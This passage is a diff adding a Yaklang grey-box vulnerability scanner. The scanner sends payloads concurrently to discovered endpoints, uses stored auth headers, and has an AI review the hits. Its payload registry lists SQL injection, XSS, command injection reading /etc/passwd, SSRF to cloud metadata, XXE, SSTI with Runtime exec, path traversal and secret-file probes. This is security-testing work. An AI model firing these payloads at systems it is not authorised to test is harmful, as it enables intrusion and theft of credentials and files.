@@ -1,0 +1,1390 @@
+// vuln_batch_scan：Phase5 Step3 灰盒漏洞批量检测引擎（Congin 高效模式）。
+// 端点并发 → 单端点内规则 payload HTTP 宽并发 → 全局批量 AI 二次研判。
+// 结果写入 SQLite dynamic_vuln_findings 表。
+//
+// 用法：
+//   yak vuln_batch_scan.yak --sqlite-path ... --session-uuid <uuid> --base-url https://host:port
+
+__DESC__ = "SSA API Discovery Phase5 Step3：Congin 高效模式灰盒批量检测。规则 payload 宽并发 HTTP，命中后统一批量 AI 二次研判，写入 dynamic_vuln_findings。"
+__VERBOSE_NAME__ = "vuln_batch_scan"
+__KEYWORDS__ = "ssa,discovery,vuln,batch,scan,greybox,ai,sqli,xss,cmdi,ssrf,ssti,xxe,csrf,deserialization,vuln_batch_scan,efficient"
+__USAGE__ = "参数：sqlite-path、session-uuid、base-url；可选 endpoint-ids、resource-concurrent、http-concurrent、timeout、host-throttle-ms、auth-header、auth-headers-file、api-desc、ai-concurrent、skip-ai-review、skip-ai-param-guess。无参数元数据时用 ai.Chat 两阶段推断（形态→参数名，各最多3轮×10组）；猜不出则跳过端点。"
+
+sqlitePath = cli.String("sqlite-path", cli.setDefault(""), cli.setHelp("session.sqlite3 绝对路径；与 db-dsn 二选一"))
+dbDsn = cli.String("db-dsn", cli.setDefault(""), cli.setHelp("PostgreSQL DSN；优先于 sqlite-path"))
+sessionUUID = cli.String("session-uuid", cli.setRequired(true), cli.setHelp("discovery_sessions.uuid"))
+baseURL = cli.String("base-url", cli.setRequired(true), cli.setHelp("目标 base URL"))
+endpointIds = cli.String("endpoint-ids", cli.setDefault(""), cli.setHelp("仅检测的 http_endpoints.id（逗号分隔）；空=全部"))
+resourceConcurrent = cli.Int("resource-concurrent", cli.setDefault(8), cli.setHelp("端点（资源）并发上限"))
+httpConcurrent = cli.Int("http-concurrent", cli.setDefault(16), cli.setHelp("单端点 payload HTTP 并发上限"))
+concurrent = cli.Int("concurrent", cli.setDefault(0), cli.setHelp("兼容旧参数：非 0 时覆盖 http-concurrent"))
+timeoutSec = cli.Int("timeout", cli.setDefault(12), cli.setHelp("单次请求超时（秒）"))
+hostThrottleMs = cli.Int("host-throttle-ms", cli.setDefault(0), cli.setHelp("每 worker 请求前休眠毫秒"))
+authHeader = cli.String("auth-header", cli.setDefault(""), cli.setHelp("鉴权 header，如 'Authorization: Bearer xxx'"))
+authHeadersFile = cli.String("auth-headers-file", cli.setDefault(""), cli.setHelp("JSON 文件路径 {\"Cookie\":\"...\"}；优先于 auth-header"))
+apiDesc = cli.String("api-desc", cli.setDefault(""), cli.setHelp("JSON 编码的 API 描述信息（核心函数、输入输出等），供 AI 分析"))
+aiConcurrent = cli.Int("ai-concurrent", cli.setDefault(6), cli.setHelp("批量二次研判 AI 并发上限"))
+skipAiReview = cli.Bool("skip-ai-review", cli.setHelp("跳过 AI 二次研判，关键字命中以 uncertain 入库"))
+skipAiParamGuess = cli.Bool("skip-ai-param-guess", cli.setHelp("跳过 ai.Chat 参数形态推断（无 query/body 元数据时直接跳过该端点）"))
+maxAiParamRounds = 3
+maxAiParamCandidatesPerRound = 10
+cli.check()
+
+sqlitePathVal = str.TrimSpace(sqlitePath)
+dbDsnVal = str.TrimSpace(dbDsn)
+if sqlitePathVal == "" && dbDsnVal == "" {
+    die("need --db-dsn or --sqlite-path")
+}
+openDiscoveryDB = () => {
+    if dbDsnVal != "" {
+        return db.OpenDatabase("postgres", dbDsnVal)
+    }
+    return db.OpenSqliteDatabase(sqlitePathVal)
+}
+
+if concurrent > 0 { httpConcurrent = concurrent }
+if httpConcurrent < 1 { httpConcurrent = 16 }
+if resourceConcurrent < 1 { resourceConcurrent = 8 }
+if aiConcurrent < 1 { aiConcurrent = 6 }
+
+testPlaceholderToken = "{TEST_payload}"
+baseHttps = str.HasPrefix(str.ToLower(str.TrimSpace(baseURL)), "https://")
+
+// ============================================================================
+// 完整漏洞检测类型清单（23+种）
+// ============================================================================
+
+vulnTypeRegistry = {
+    "sqli": {
+        "name": "SQL注入漏洞", "scope": "all", "severity": "high",
+        "payloads": ["' OR '1'='1", "1 OR 1=1--", "' UNION SELECT NULL--", "1; WAITFOR DELAY '0:0:3'--", "' AND SLEEP(3)--", "1' ORDER BY 1--", "') OR ('1'='1"],
+        "indicators": ["sql", "syntax", "mysql", "ora-", "postgresql", "sqlite", "h2", "jdbc", "unclosed quotation", "quoted string", "you have an error", "sqlstate", "\"query\"", "select id", "payload_reflected"],
+    },
+    "xss": {
+        "name": "XSS漏洞", "scope": "all", "severity": "medium",
+        "payloads": ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "javascript:alert(1)", "'><svg/onload=alert(1)>", "<img src=1 onerror=alert(1)>", "{{7*7}}"],
+        "indicators": ["<script>alert(1)</script>", "onerror=alert", "<svg/onload", "<img src=1 onerror"],
+    },
+    "cmdi": {
+        "name": "命令执行漏洞", "scope": "all", "severity": "critical",
+        "payloads": [";id", "|id", "`id`", "$(id)", ";cat /etc/passwd", "|cat /etc/passwd", "&& whoami", "|| whoami", ";ping -c 3 127.0.0.1"],
+        "indicators": ["uid=0(", "gid=0(", "www-data", "groups=0("],
+    },
+    "ssrf": {
+        "name": "SSRF漏洞", "scope": "all", "severity": "high",
+        "payloads": ["http://127.0.0.1:22", "http://169.254.169.254/latest/meta-data/", "http://[::1]/", "http://0.0.0.0:22", "http://localhost:6379/", "dict://127.0.0.1:6379/info", "file:///etc/passwd"],
+        "indicators": ["SSH-2.0-", "ami-id", "instance-id", "meta-data", "redis_version"],
+    },
+    "path_traversal": {
+        "name": "目录遍历漏洞", "scope": "all", "severity": "high",
+        "payloads": ["../../etc/passwd", "..\\..\\windows\\win.ini", "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd", "....\\....\\windows\\win.ini"],
+        "indicators": ["root:x:", "[extensions]", "for 16-bit", "daemon:x:", "bin:x:"],
+    },
+    "ssti": {
+        "name": "SSTI模板注入", "scope": "all", "severity": "high",
+        "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config}}", "{{self.__class__}}", "${T(java.lang.Runtime).getRuntime().exec('id')}", "#{7*7}", "{{''.__class__.__mro__[2].__subclasses__()}}"],
+        "indicators": ["49", "config", "__class__", "subclasses", "Runtime"],
+    },
+    "xxe": {
+        "name": "XML实体注入/XXE", "scope": "no_get", "severity": "high",
+        "payloads": [`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`, `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><root>&xxe;</root>`],
+        "indicators": ["root:x:", "SSH-", "daemon:x:"],
+        "content_type": "application/xml",
+    },
+    "deserialization": {
+        "name": "反序列化漏洞", "scope": "no_get", "severity": "critical",
+        "payloads": [`{"@type":"java.net.Inet4Address","val":"dnslog.test.com"}`, `O:8:"stdClass":0:{}`, `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==`],
+        "indicators": ["java.lang", "ClassNotFoundException", "UnserializeException", "cannot unmarshal", "deserialization"],
+    },
+    "upload_bypass": {"name": "上传漏洞", "scope": "no_get", "severity": "high", "payloads": [], "indicators": ["uploaded successfully", "file saved", "upload complete"]},
+    "csrf": {"name": "CSRF（跨站请求伪造）", "scope": "no_get", "severity": "medium", "payloads": [], "indicators": [], "passive_check": true},
+    "over_auth": {"name": "越权访问漏洞", "scope": "all", "severity": "high", "payloads": [], "indicators": [], "passive_check": true},
+    "cleartext_transmission": {"name": "明文传输", "scope": "root_only", "severity": "medium", "payloads": [], "indicators": [], "passive_check": true},
+    "backend_leak": {
+        "name": "后台泄露漏洞", "scope": "root_only", "severity": "high",
+        "payloads": ["/admin", "/admin/login", "/manager", "/console", "/actuator", "/actuator/env", "/swagger-ui.html", "/druid/login.html", "/phpmyadmin", "/debug"],
+        "indicators": ["admin", "login", "dashboard", "console", "actuator", "druid"],
+        "is_path_scan": true,
+    },
+    "info_leak": {
+        "name": "敏感信息泄露", "scope": "root_only", "severity": "medium",
+        "payloads": ["/.env", "/.git/config", "/WEB-INF/web.xml", "/crossdomain.xml", "/robots.txt", "/sitemap.xml", "/server-status", "/.DS_Store", "/backup.sql", "/phpinfo.php", "/actuator/configprops"],
+        "indicators": ["DB_PASSWORD", "SECRET_KEY", "PRIVATE", "[core]", "web-app", "phpinfo", "server-status"],
+        "is_path_scan": true,
+    },
+    "session_replay": {"name": "关键会话重放攻击", "scope": "no_get", "severity": "medium", "payloads": [], "indicators": [], "passive_check": true},
+    "file_include": {
+        "name": "任意文件包含/任意文件下载", "scope": "all", "severity": "high",
+        "payloads": ["/etc/passwd", "C:\\windows\\win.ini", "php://filter/convert.base64-encode/resource=index", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=", "file=../../../etc/passwd"],
+        "indicators": ["root:x:", "[extensions]", "PD9waH", "phpinfo"],
+    },
+    "logic_flaw": {"name": "设计缺陷/逻辑错误", "scope": "all", "severity": "medium", "payloads": [], "indicators": [], "passive_check": true},
+    "risky_services": {"name": "检测存在风险的无关服务和端口", "scope": "root_only", "severity": "medium", "payloads": [], "indicators": [], "passive_check": true},
+    "captcha_bypass": {"name": "登录功能验证码漏洞", "scope": "login_only", "severity": "medium", "payloads": [], "indicators": [], "passive_check": true},
+    "insecure_cookie": {"name": "不安全的Cookies", "scope": "root_only", "severity": "low", "payloads": [], "indicators": [], "passive_check": true},
+    "ssl_vuln": {"name": "SSL漏洞", "scope": "root_only", "severity": "medium", "payloads": [], "indicators": [], "passive_check": true},
+    "weak_password": {"name": "默认口令/弱口令", "scope": "login_only", "severity": "high", "payloads": [], "indicators": [], "passive_check": true},
+    "other_vuln": {"name": "其他漏洞", "scope": "all", "severity": "medium", "payloads": [], "indicators": [], "passive_check": true},
+}
+
+activeVulnTypes = [
+    "sqli", "xss", "cmdi", "ssrf", "path_traversal",
+    "ssti", "xxe", "deserialization",
+    "backend_leak", "info_leak", "file_include",
+]
+
+// ============================================================================
+// 工具函数
+// ============================================================================
+
+joinURL = (base, pathPattern) => {
+    p = str.TrimSpace(pathPattern)
+    if p == "" { return str.TrimSuffix(str.TrimSpace(base), "/") }
+    lp = str.ToLower(p)
+    if str.HasPrefix(lp, "http://") || str.HasPrefix(lp, "https://") { return p }
+    b = str.TrimSuffix(str.TrimSpace(base), "/")
+    if !str.HasPrefix(p, "/") { p = "/" + p }
+    if b == "" { return p }
+    return b + p
+}
+
+checkIndicators = (body, indicators) => {
+    lb = str.ToLower(body)
+    matched = []
+    for indicator in indicators {
+        if str.Contains(lb, str.ToLower(indicator)) {
+            matched = append(matched, indicator)
+        }
+    }
+    return matched
+}
+
+isLoginEndpoint = (path, handler) => {
+    lp = str.ToLower(path)
+    lh = str.ToLower(handler)
+    for kw in ["login", "signin", "sign_in", "auth", "token", "oauth", "sso"] {
+        if str.Contains(lp, kw) || str.Contains(lh, kw) { return true }
+    }
+    return false
+}
+
+isRootPath = (path) => {
+    p = str.TrimSpace(path)
+    return p == "/" || p == "" || p == "/index" || p == "/index.html" || p == "/home"
+}
+
+truncateStr = (s, maxLen) => {
+    if len(s) > maxLen { return s[:maxLen] + "...(truncated)" }
+    return s
+}
+
+stripFenceJsonLang = (seg) => {
+    seg = str.TrimSpace(seg)
+    lp = str.ToLower(seg)
+    if !str.HasPrefix(lp, "json") { return seg }
+    for i = 0; i < len(seg); i++ {
+        if seg[i:i+1] == "\n" { return str.TrimSpace(seg[i+1:]) }
+    }
+    return seg
+}
+
+normalizeMarkdownFence = (raw) => {
+    s = str.TrimSpace(raw)
+    if s == "" { return s }
+    if !str.Contains(s, "```") { return s }
+    parts = str.Split(s, "```")
+    for pi = 1; pi < len(parts); pi += 2 {
+        seg = str.TrimSpace(parts[pi])
+        seg = stripFenceJsonLang(seg)
+        if str.Contains(seg, "{") { return seg }
+    }
+    return s
+}
+
+// 从字符串中提取首个平衡的 {...} JSON 片段
+extractBalancedJSONObject = (s) => {
+    ls = len(s)
+    depth = 0
+    start = -1
+    for i = 0; i < ls; i++ {
+        ch = s[i:i+1]
+        if ch == "{" {
+            if depth == 0 && start < 0 { start = i }
+            depth++
+        } elif ch == "}" {
+            if depth > 0 { depth-- }
+            if depth == 0 && start >= 0 { return str.TrimSpace(s[start:i+1]) }
+        }
+    }
+    return str.TrimSpace(s)
+}
+
+chatParseJSONObject = (raw) => {
+    s = normalizeMarkdownFence(raw)
+    m = undefined
+    try { m = json.loads(s)~ } catch ex {}
+    if m != nil { return m }
+    brace = extractBalancedJSONObject(s)
+    if brace == "" { return nil }
+    try { return json.loads(brace)~ } catch ex {}
+    return nil
+}
+
+summarizeBuiltinPayloadKnowledge = (vDef) => {
+    if vDef == nil || vDef["payloads"] == nil { return "" }
+    pl = vDef["payloads"]
+    out = ""
+    n = len(pl)
+    capN = min(n, 12)
+    for i = 0; i < capN; i++ { out = out + " - " + sprint(pl[i]) + "\n" }
+    if n > capN { out = out + sprintf("...(共%d条内置参考)\n", n) }
+    return out
+}
+
+sanitizePayloadSlice = (arr, limit) => {
+    out = []
+    if arr == nil || limit <= 0 { return out }
+    for x in arr {
+        if len(out) >= limit { break }
+        p = str.TrimSpace(sprint(x))
+        if p == "" { continue }
+        out = append(out, p)
+    }
+    return out
+}
+
+trimHostTrailingSlash = host => str.TrimSuffix(str.TrimSpace(host), "/")
+
+extractHostAuthorityFromBase = base => {
+    b = trimHostTrailingSlash(base)
+    if str.HasPrefix(str.ToLower(b), "https://") {
+        b = trimHostTrailingSlash(b[len("https://"):])
+    } elif str.HasPrefix(str.ToLower(b), "http://") {
+        b = trimHostTrailingSlash(b[len("http://"):])
+    } else {
+        b = trimHostTrailingSlash(b)
+    }
+    if b == "" { return "" }
+    partsHost = str.Split(b, "/")
+    if len(partsHost) > 0 { return str.TrimSpace(partsHost[0]) }
+    return ""
+}
+
+extractPathQueryFromJoinedURL = full => {
+    u = trimHostTrailingSlash(str.TrimSpace(full))
+    if str.HasPrefix(str.ToLower(u), "https://") {
+        u = u[len("https://"):]
+    } elif str.HasPrefix(str.ToLower(u), "http://") {
+        u = u[len("http://"):]
+    }
+    for i = 0; i < len(u); i++ {
+        if u[i:i+1] == "/" { return u[i:] }
+    }
+    return "/"
+}
+
+samplePathLiteral = pathPattern => {
+    p = str.TrimSpace(pathPattern)
+    if p == "" { return "" }
+    lp = str.ToLower(p)
+    if str.HasPrefix(lp, "http://") || str.HasPrefix(lp, "https://") { return p }
+    p = str.ReplaceAll(p, "**", "*")
+    partsPath = str.Split(p, "/")
+    outSeg = []
+    for part in partsPath {
+        seg = part
+        if seg == "" { outSeg = append(outSeg, seg); continue }
+        if seg == "*" {
+            seg = "1"
+        } elif str.HasPrefix(seg, ":") {
+            seg = "1"
+        } elif str.Contains(seg, "<") && str.Contains(seg, ">") {
+            seg = "1"
+        } elif str.Contains(seg, "{") {
+            seg = "1"
+        }
+        outSeg = append(outSeg, seg)
+    }
+    return str.Join(outSeg, "/")
+}
+
+guessURLFromProbablePacket = substitutedPacket => {
+    normPkt = str.ReplaceAll(str.TrimSpace(substitutedPacket), "\r\n", "\n")
+    linesRaw = str.Split(normPkt, "\n")
+    lines = []
+    for lx in linesRaw { lines = append(lines, str.TrimSpace(lx)) }
+    if len(lines) == 0 { return str.TrimSuffix(str.TrimSpace(baseURL), "/") }
+    reqLine = lines[0]
+    toks = str.Split(reqLine, " ")
+    if len(toks) < 2 { return str.TrimSuffix(str.TrimSpace(baseURL), "/") }
+    uri = str.TrimSpace(toks[1])
+    if uri == "" { uri = "/" }
+    b = str.TrimSuffix(str.TrimSpace(baseURL), "/")
+    if str.HasPrefix(uri, "http://") || str.HasPrefix(uri, "https://") { return uri }
+    if !str.HasPrefix(uri, "/") { uri = "/" + uri }
+    return b + uri
+}
+
+countPlaceholder = s => {
+    if str.TrimSpace(s) == "" { return 0 }
+    return len(str.Split(s, testPlaceholderToken)) - 1
+}
+
+buildQueryInjectionPath = (pathQ, placeholder) => {
+    pq = str.TrimSpace(pathQ)
+    if pq == "" { pq = "/" }
+    if !str.HasPrefix(pq, "/") { pq = "/" + pq }
+    if !str.Contains(pq, "?") {
+        return pq + "?fuzz=" + placeholder
+    }
+    qIdx = str.Index(pq, "?")
+    basePath = pq[:qIdx]
+    query = pq[qIdx+1:]
+    ampIdx = str.Index(query, "&")
+    firstPair = query
+    rest = ""
+    if ampIdx >= 0 {
+        firstPair = query[:ampIdx]
+        rest = query[ampIdx:]
+    }
+    eqIdx = str.Index(firstPair, "=")
+    if eqIdx >= 0 {
+        paramName = firstPair[:eqIdx]
+        return basePath + "?" + paramName + "=" + placeholder + rest
+    }
+    return pq + "&fuzz=" + placeholder
+}
+
+parseQueryParamNames = queryJSON => {
+    names = []
+    raw = str.TrimSpace(queryJSON)
+    if raw == "" { return names }
+    try {
+        j = json.loads(raw)~
+        if j == nil { return names }
+        if typeof(j) == "map[string]interface {}" {
+            for k, _ in j { names = append(names, sprint(k)) }
+            return names
+        }
+        for item in j {
+            if typeof(item) == "string" {
+                s = str.TrimSpace(sprint(item))
+                if s != "" { names = append(names, s) }
+                continue
+            }
+            if typeof(item) == "map[string]interface {}" {
+                if item["name"] != nil {
+                    n = str.TrimSpace(sprint(item["name"]))
+                    if n != "" { names = append(names, n) }
+                }
+            }
+        }
+    } catch ex {}
+    return names
+}
+
+replaceFirstQueryValueWithPlaceholder = fullURL => {
+    u = str.TrimSpace(fullURL)
+    if u == "" || !str.Contains(u, "?") { return u }
+    pathQ = extractPathQueryFromJoinedURL(u)
+    if pathQ == "" || !str.Contains(pathQ, "?") { return u }
+    injectedPath = buildQueryInjectionPath(pathQ, testPlaceholderToken)
+    hostAu = extractHostAuthorityFromBase(u)
+    if hostAu == "" { hostAu = extractHostAuthorityFromBase(baseURL) }
+    scheme = "http://"
+    if baseHttps || str.HasPrefix(str.ToLower(u), "https://") { scheme = "https://" }
+    return scheme + hostAu + injectedPath
+}
+
+appendFirstQueryParam = (fullURL, paramName) => {
+    u = str.TrimSpace(fullURL)
+    p = str.TrimSpace(paramName)
+    if u == "" || p == "" { return u }
+    if str.Contains(u, "?") {
+        return replaceFirstQueryValueWithPlaceholder(u)
+    }
+    return u + "?" + p + "=" + testPlaceholderToken
+}
+
+buildSampleJoinFromVhaMeta = (meth, pathPattern, meta, fallbackURL) => {
+    sampleURL = ""
+    queryJSON = ""
+    if meta != nil {
+        sampleURL = str.TrimSpace(sprint(meta["full_sample_url"]))
+        queryJSON = str.TrimSpace(sprint(meta["query_params_json"]))
+    }
+    if sampleURL != "" {
+        if str.Contains(sampleURL, "?") {
+            return replaceFirstQueryValueWithPlaceholder(sampleURL)
+        }
+        names = parseQueryParamNames(queryJSON)
+        if len(names) > 0 {
+            return appendFirstQueryParam(sampleURL, names[0])
+        }
+        return sampleURL
+    }
+    names = parseQueryParamNames(queryJSON)
+    baseJoin = str.TrimSpace(fallbackURL)
+    if baseJoin == "" {
+        baseJoin = joinURL(baseURL, samplePathLiteral(pathPattern))
+    }
+    if len(names) > 0 {
+        return appendFirstQueryParam(baseJoin, names[0])
+    }
+    return baseJoin
+}
+
+hasInjectableParamMeta = (sampledJoin, queryJSON, bodyHintJSON) => {
+    if str.TrimSpace(bodyHintJSON) != "" { return true }
+    if len(parseQueryParamNames(queryJSON)) > 0 { return true }
+    if str.Contains(str.TrimSpace(sampledJoin), "?") { return true }
+    return false
+}
+
+jsonEscapeString = s => {
+    s = sprint(s)
+    s = str.ReplaceAll(s, "\\", "\\\\")
+    s = str.ReplaceAll(s, "\"", "\\\"")
+    s = str.ReplaceAll(s, "\n", "\\n")
+    s = str.ReplaceAll(s, "\r", "\\r")
+    s = str.ReplaceAll(s, "\t", "\\t")
+    return s
+}
+
+encodePayloadForPacket = (tmplPkt, payload) => {
+    pay = sprint(payload)
+    lp = str.ToLower(tmplPkt)
+    if str.Contains(lp, "application/json") {
+        return jsonEscapeString(pay)
+    }
+    if str.Contains(tmplPkt, "?fuzz=") || str.Contains(tmplPkt, "&fuzz=") || str.Contains(tmplPkt, "?") {
+        return codec.EscapeQueryUrl(pay)
+    }
+    return pay
+}
+
+buildHeuristicInjectionPacket = (methUpper, sampledJoinURL, vDef, bodyHintJSON) => {
+    hostAu = extractHostAuthorityFromBase(baseURL)
+    if hostAu == "" { return "" }
+    pathQ = extractPathQueryFromJoinedURL(sampledJoinURL)
+    if pathQ == "" { pathQ = "/" }
+    if !str.HasPrefix(pathQ, "/") { pathQ = "/" + pathQ }
+
+    hasCTOverride = false
+    ctOv = ""
+    if vDef != nil && vDef["content_type"] != nil && sprint(vDef["content_type"]) != "" {
+        hasCTOverride = true
+        ctOv = sprint(vDef["content_type"])
+    }
+    scopeT = "all"
+    if vDef != nil && vDef["scope"] != nil { scopeT = sprint(vDef["scope"]) }
+
+    // Congin：no_get（XXE/反序列化/上传等）在真实流量上应以带 Body 的包探测，不落在 GET ?query 上；启发式兜底时与方法列是否 POST 无关，GET 会在下方升格为 POST。
+    usePostBodyStyle = false
+    if hasCTOverride {
+        usePostBodyStyle = true
+    } elif scopeT == "no_get" {
+        usePostBodyStyle = true
+    }
+
+    mu = str.ToUpper(str.TrimSpace(methUpper))
+    if mu == "" { mu = "GET" }
+
+    if usePostBodyStyle {
+        bm = mu
+        if bm == "GET" || bm == "HEAD" || bm == "OPTIONS" {
+            bm = "POST"
+        }
+        bd = sprintf(`{"fuzz":"%s"}`, testPlaceholderToken)
+        bodyFields = parseQueryParamNames(bodyHintJSON)
+        if len(bodyFields) > 0 {
+            first = bodyFields[0]
+            bd = sprintf(`{"%s":"%s"}`, first, testPlaceholderToken)
+        }
+        if hasCTOverride {
+            return sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nContent-Type: %s\r\nConnection: close\r\n\r\n%s", bm, pathQ, hostAu, ctOv, testPlaceholderToken)
+        }
+        return sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n%s", bm, pathQ, hostAu, bd)
+    }
+
+    rel = buildQueryInjectionPath(pathQ, testPlaceholderToken)
+    return sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nAccept: */*\r\nUser-Agent: yak-vuln-batch\r\n\r\n", mu, rel, hostAu)
+}
+
+injectPayloadIntoRawPacket = (tmplPkt, payload) => {
+    if tmplPkt == "" { return "" }
+    enc = encodePayloadForPacket(tmplPkt, payload)
+    return str.ReplaceAll(tmplPkt, testPlaceholderToken, enc)
+}
+
+flipMethodFor405 = pkt => {
+    if pkt == "" { return "" }
+    lines = str.Split(str.ReplaceAll(pkt, "\r\n", "\n"), "\n")
+    if len(lines) == 0 { return "" }
+    parts = str.Split(str.TrimSpace(lines[0]), " ")
+    if len(parts) < 2 { return "" }
+    method = str.ToUpper(parts[0])
+    uri = parts[1]
+    if method == "POST" {
+        if str.Contains(uri, "?") {
+            return str.ReplaceAll(pkt, "POST "+uri, "GET "+uri)
+        }
+    } elif method == "GET" && str.Contains(uri, "?") {
+        pathOnly = uri
+        qIdx = str.Index(uri, "?")
+        if qIdx >= 0 { pathOnly = uri[:qIdx] }
+        bodyLine = ""
+        for i = 1; i < len(lines); i++ {
+            if str.TrimSpace(lines[i]) == "" {
+                if i+1 < len(lines) { bodyLine = lines[i+1] }
+                break
+            }
+        }
+        ct = "application/x-www-form-urlencoded"
+        if bodyLine != "" && str.HasPrefix(str.TrimSpace(bodyLine), "{") {
+            ct = "application/json"
+        }
+        hostAu = extractHostAuthorityFromBase(baseURL)
+        return sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: %s\r\nConnection: close\r\n\r\n%s", pathOnly, hostAu, ct, bodyLine)
+    }
+    return ""
+}
+
+// ============================================================================
+// 数据库初始化
+// ============================================================================
+
+gormDB, err = openDiscoveryDB()
+if err != nil { die(err) }
+
+sessRows, err = db.ScanResult(gormDB, "SELECT id FROM discovery_sessions WHERE uuid = ?", sessionUUID)
+if err != nil { die(err) }
+if len(sessRows) == 0 { die(sprintf("session not found: uuid=%s", sessionUUID)) }
+sessionID = int(parseInt(sprint(sessRows[0]["id"])))
+if sessionID <= 0 { die(sprintf("session not found: invalid id for uuid=%s", sessionUUID)) }
+
+vbsHeadersMapFromJSONFile = path => {
+    out = make(map[string]string)
+    p = str.TrimSpace(path)
+    if p == "" { return out }
+    try {
+        raw = string(file.ReadFile(p)~)
+        j = json.loads(raw)~
+        if j == nil { return out }
+        for k, v in j { out[sprint(k)] = sprint(v) }
+    } catch ex { log.warn("auth-headers-file: %v", ex) }
+    return out
+}
+
+vbsResolveBatchAuthHeaders = () => {
+    hm = make(map[string]string)
+    fp = str.TrimSpace(authHeadersFile)
+    if fp != "" {
+        hm = vbsHeadersMapFromJSONFile(fp)
+    }
+    if len(hm) == 0 && str.TrimSpace(authHeader) != "" {
+        parts = str.SplitN(str.TrimSpace(authHeader), ":", 2)
+        if len(parts) == 2 {
+            hn = str.TrimSpace(parts[0])
+            hv = str.TrimSpace(parts[1])
+            if hn != "" && hv != "" { hm[hn] = hv }
+        }
+    }
+    if len(hm) == 0 {
+        try {
+            sidInt = int(sessionID)
+            if sidInt > 0 {
+                sqlCred = sprintf("SELECT headers_json, header_name, header_value FROM auth_credentials WHERE session_id = %d AND verified != 0 ORDER BY id DESC LIMIT 1", sidInt)
+                rows, qerr = db.ScanResult(gormDB, sqlCred)
+                if qerr == nil && rows != nil && len(rows) > 0 {
+                    row = rows[0]
+                    hj = str.TrimSpace(sprint(row["headers_json"]))
+                    if hj != "" {
+                        try {
+                            j = json.loads(hj)~
+                            if j != nil {
+                                for k, v in j { hm[sprint(k)] = sprint(v) }
+                            }
+                        } catch exj {}
+                    }
+                    if len(hm) == 0 {
+                        hn = str.TrimSpace(sprint(row["header_name"]))
+                        hv = sprint(row["header_value"])
+                        if hn != "" && str.TrimSpace(hv) != "" { hm[hn] = str.TrimSpace(hv) }
+                    }
+                }
+            }
+        } catch ex2 { log.warn("auth_credentials: %v", ex2) }
+    }
+    return hm
+}
+
+batchAuthHeadersMap = vbsResolveBatchAuthHeaders()
+
+pocOptsWithAuthHeaders = () => {
+    pocOpts = [poc.timeout(timeoutSec)]
+    for k, v in batchAuthHeadersMap {
+        pocOpts = append(pocOpts, poc.replaceHeader(k, v))
+    }
+    return pocOpts
+}
+
+// 原始报文单次探测（Congin-style），返回 {"body","status_code"} 或 nil
+sendRawHTTPProbe = substitutedPacket => {
+    if substitutedPacket == "" { return nil }
+    if countPlaceholder(substitutedPacket) > 0 { return nil }
+    try {
+        rsp, _, er = poc.HTTP(substitutedPacket, poc.https(baseHttps), pocOptsWithAuthHeaders()...)~
+        if er != nil || rsp == nil { return nil }
+        sc = poc.GetStatusCodeFromResponse(rsp.RawPacket)
+        body = string(rsp.GetBody())
+        if sc == 405 {
+            alt = flipMethodFor405(substitutedPacket)
+            if alt != "" && alt != substitutedPacket {
+                rsp2, _, er2 = poc.HTTP(alt, poc.https(baseHttps), pocOptsWithAuthHeaders()...)~
+                if er2 == nil && rsp2 != nil {
+                    sc2 = poc.GetStatusCodeFromResponse(rsp2.RawPacket)
+                    if sc2 != 405 {
+                        return {"body": string(rsp2.GetBody()), "status_code": sc2, "req_raw": alt}
+                    }
+                }
+            }
+        }
+        return {"body": body, "status_code": sc, "req_raw": substitutedPacket}
+    } catch er2 { return nil }
+}
+
+// Path-scan：仍沿用 URL 拼装 + poc.Get（无包文模板语义）
+probePathScan = pay => {
+    testURL = joinURL(baseURL, pay)
+    try {
+        pocOptsAuth = pocOptsWithAuthHeaders()
+        rsp, _, er = poc.Get(testURL, pocOptsAuth...)
+        if er != nil || rsp == nil { return nil }
+        return {"body": string(rsp.GetBody()), "status_code": poc.GetStatusCodeFromResponse(rsp.RawPacket)}
+    } catch ex { return nil }
+}
+
+// --- ai.Chat 参数形态推断（无 ReAct；最多 3 轮 × 每轮 10 组） ---
+aiParamChatJSON = prompt => {
+    raw = ""
+    try {
+        raw = ai.Chat(prompt, ai.funcCallRetryTimes(2))~
+    } catch ex {
+        return nil, sprintf("ai.Chat failed: %v", ex)
+    }
+    m = chatParseJSONObject(raw)
+    if m == nil {
+        return nil, sprintf("parse ai JSON failed: %s", truncateStr(raw, 300))
+    }
+    return m, ""
+}
+
+probeCandidateAcceptable = sc => {
+    if sc == nil { return false }
+    code = 0
+    try { code = parseInt(sprint(sc)) } catch ex { return false }
+    if code == 405 || code == 415 { return false }
+    if code >= 200 && code < 500 { return true }
+    return false
+}
+
+buildBodyFromCandidateParams = (style, params) => {
+    if params == nil || len(params) == 0 { return "" }
+    if style == "json_body" {
+        parts = []
+        for p in params {
+            n = sprint(p["name"])
+            if n == "" { continue }
+            v = sprint(p["sample"])
+            if v == "" { v = "test" }
+            parts = append(parts, sprintf(`"%s":"%s"`, n, jsonEscapeString(v)))
+        }
+        if len(parts) == 0 { return "{}" }
+        return "{" + str.Join(parts, ",") + "}"
+    }
+    if style == "form_body" {
+        pairs = []
+        for p in params {
+            n = sprint(p["name"])
+            if n == "" { continue }
+            v = sprint(p["sample"])
+            if v == "" { v = "test" }
+            pairs = append(pairs, codec.EscapeQueryUrl(n) + "=" + codec.EscapeQueryUrl(v))
+        }
+        return str.Join(pairs, "&")
+    }
+    return ""
+}
+
+buildURLFromCandidate = (candidate, pathPattern) => {
+    style = str.ToLower(str.TrimSpace(sprint(candidate["param_style"])))
+    method = str.ToUpper(str.TrimSpace(sprint(candidate["method"])))
+    params = candidate["params"]
+    basePath = joinURL(baseURL, samplePathLiteral(pathPattern))
+    if style == "query" || style == "query_string" {
